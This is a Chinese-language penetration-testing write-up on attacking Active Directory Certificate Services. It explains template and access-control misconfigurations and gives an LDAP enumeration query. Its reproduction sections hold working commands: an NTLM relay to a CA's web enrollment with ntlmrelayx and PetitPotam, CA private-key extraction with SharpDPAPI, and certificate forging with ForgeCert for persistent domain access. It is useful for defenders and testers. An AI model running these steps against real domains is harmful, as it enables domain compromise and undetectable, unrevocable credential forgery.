### 漏洞分析与利用

#### 1. 漏洞概述
使用公开的工具可以检测到系统中存在的漏洞。攻击者可以利用这些漏洞创建具有任意扩展密钥用途 (EKU) 和证书值的新证书，这可能导致滥用代码签名、服务器身份验证等功能。

#### 2. LDAP 查询
可以通过以下 LDAP 查询来枚举匹配此场景的模板：
```ldap
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*))) (|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

个人认为这个漏洞的利用面并不大。

#### 3. 证书请求代理 EKU
证书请求代理 EKU（OID 1.3.6.1.4.1.311.20.2.1）允许委托人代表其他用户申请证书。对于注册此类模板的任何用户，生成的证书可用于代表任何用户共同签署请求。利用条件类似于ESC1，还需要应用策略开启“证书请求代理”。

微软文档：[Certificate Request Agent](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cersod/97f47d4c-2901-41fa-9616-96b94e1b5435)

#### 4. 漏洞复现
- 使用公开的工具可以看到存在漏洞。
- 在 Active Directory 中定义了一个证书模板，该模板具有 `msPKI-RA-Application-Policies` 属性集，并带有增强的密钥使用 (EKU)，例如，证书请求代理（OID 1.3.6.1.4.1.311.20.2.1）。证书模板还在 `msPKI-Enrollment-Flag` 字段上设置了 `CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT` 位。
- 注册代理具有包含 EKU 的证书，该 EKU 具有与先前模板的 `msPKI-RA-Application-Policies` 属性中定义的相同对象标识符 (OID)。
- CA 确定与请求对应的证书模板需要注册代理的签名。它验证签名并验证与签名关联的证书是否具有所需的 EKU。验证完成后，CA 颁发证书并将其发送给注册代理。

#### 5. 证书模板访问控制
证书模板是活动目录中的安全对象，其安全描述符指定了哪些活动目录委托人对模板具有特定权利。如果允许意外或非特权的委托人编辑安全设置，则模板将被视为在访问控制级别上配置错误。攻击者可能会将错误配置推送到模板，从而允许他们泄露活动目录域的元素。

Chris Falta 讨论了一种使用此错误配置来模拟域名用户、修改模板以允许虚拟智能卡注册、获取证书然后重置模板的方法。
- [PoshADCS GitHub 仓库](https://github.com/cfalta/PoshADCS)

#### 6. 易受攻击的 PKI 对象访问控制
如果模板的访问控制条目 (ACE) 允许意外的或没有特权的 Active Directory 主体编辑模板中的敏感安全设置，则我们说模板在访问控制级别配置错误。攻击者可以将访问链接到一个点，主动将错误配置推送到不容易受到攻击的模板，例如通过启用模板的 `mspki-certificate-name-flag` 属性中的 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 位允许域身份验证。

易受攻击的 PKI 对象访问控制可能影响多个对象和证书颁发机构本身的安全性，包括但不限于：
- CA 服务器的 AD 计算机对象（即通过 S4U2Self 或 S4U2Proxy 进行破坏）
- CA 服务器的 RPC/DCOM 服务器
- 容器 CN=Public Key Services、CN=Services、CN=Configuration、DC=、DC= 中的任何子代 AD 对象或容器（例如，证书模板容器、证书颁发机构容器、NTAuthCertificates 对象、注册服务容器等）

如果低权限攻击者可以控制其中任何一个，则该攻击可能会危及 PKI 系统。

#### 7. 证书机构权限
证书机构还可以通过证书认证机构命令访问权限，主要包括：
- 管理卡（CA 管理员）
- 管理认证（经理批准）权限

这些权限应进行审核。管理 CA 权限允许委托人执行多项行政操作，包括修改配置数据。管理认证权限允许用户批准待定的证书。

#### 8. HTTP 基于的注册方法
AD CS 通过管理员可以选择安装的附加服务器角色支持多种基于 HTTP 的注册方法，包括：
- 证书注册 Web 界面，通过安装证书颁发机构 Web 注册角色。
- 作为在 `http:///certsrv/` 上运行的 IIS 托管的 ASP Web 注册应用程序公开。
- 证书注册服务 (CES)，通过安装证书注册 Web 服务角色。
- 与证书注册策略 (CEP) Web 服务协同工作的证书注册策略 Web 服务。
- 网络设备注册服务 (NDES)，通过安装网络设备注册服务角色。

这些基于 HTTP 的证书注册接口都容易受到 NTLM 中继攻击。攻击者可以模拟入站 NTLM 身份验证的受害者用户，访问这些 Web 界面并根据用户或机器证书模板请求客户端身份验证证书。

#### 9. 漏洞复现步骤
- **搭建辅助域控**：选择从主域复制，然后默认即可。使用 `repadmin /replsummary` 测试。
- **编译 ExAndroidDev 版本的 NtlmRelayX**：
  ```sh
  git clone https://github.com/ExAndroidDev/impacket
  cd impacket
  git switch ntlmrelayx-adcs-attack
  python3 -m pip install .
  cd examples
  python3 ntlmrelayx.py -t http://192.168.50.142/certsrv/certfnsh.asp - smb2support --adcs --template 'adcs'
  ```
- **强制帐户向受到攻击的计算机进行身份验证**：使用 PetitPotam。
  ```sh
  PetitPotam.exe
  ```

#### 10. 伪造证书
- **提取 CA 证书和私钥**：如果密钥不受硬件保护，Mimikatz 和 SharpDPAPI 可以从 CA 中提取 CA 证书和私钥。
  ```sh
  SharpDPAPI.exe certificates /machine
  openssl pkcs12 -in ca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ca.pfx
  ```
- **伪造证书**：使用 ForgeCert 工具。
  ```sh
  ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Password123!" --Subject "CN=User" --SubjectAltName "PI:EMAIL" --NewCertPath localadmin.pfx --NewCertPassword "NewPassword123!"
  ```

#### 11. 域持久性
要使用证书进行身份验证，CA 必须向账号颁发一个包含允许域身份验证的 EKU OID 的证书（例如客户端身份验证）。当账号使用证书进行身份验证时，AD 在根 CA 和 NT Auth Certificates 验证证书链对象指定的 CA 证书。如果窃取了 CA 根证书私钥，攻击者可以伪造自己的证书，用于组织中的任何人向 Active Directory 进行身份验证。

#### 12. 注意事项
- 伪造的证书将有效到指定的结束日期（通常为一年），并且只要根 CA 证书有效（通常有效期从 5 年开始，但通常延长到 10 年以上）。
- 生产的证书可以与 Rubeus 一起使用来请求 TGT（和/或检索用户的 NTLM）。
- 由于我们没有经过正常的签发流程，这个伪造的证书是不能撤销的，在 ADCS 中也无法发现这个伪造的证书。

---  
网空对抗中心 李国聪（李木）